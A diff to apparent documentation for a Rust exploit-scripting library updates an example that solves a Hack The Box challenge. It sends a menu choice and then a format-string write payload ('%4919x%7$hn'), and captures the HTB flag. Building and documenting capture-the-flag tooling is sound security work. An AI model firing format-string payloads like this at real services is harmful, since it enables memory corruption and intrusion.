@@ -79,16 +79,16 @@ pipe.interactive_ansi().await?;
 ### Payload
 ```rs
 let payload = Payload::builder()
-    .recv_until("> ")
+    .recv_until("> ", false)
     .push("1")
     .push("\n")
     .send()
-    .recv_until("Insert card's serial number: ")
+    .recv_until("Insert card's serial number: ", false)
     .push_line("%4919x%7$hn")
     .send()
-    .recv_regex(r"HTB\{[^\}]+\}")
-    .print()
+    .recv_regex_utf8(r"HTB\{[^\}]+\}")
     .build();
 
-pipe.payload(&payload).await?;
+let flag = pipe.payload(payload).await?;
+println!("{flag}");
 ```
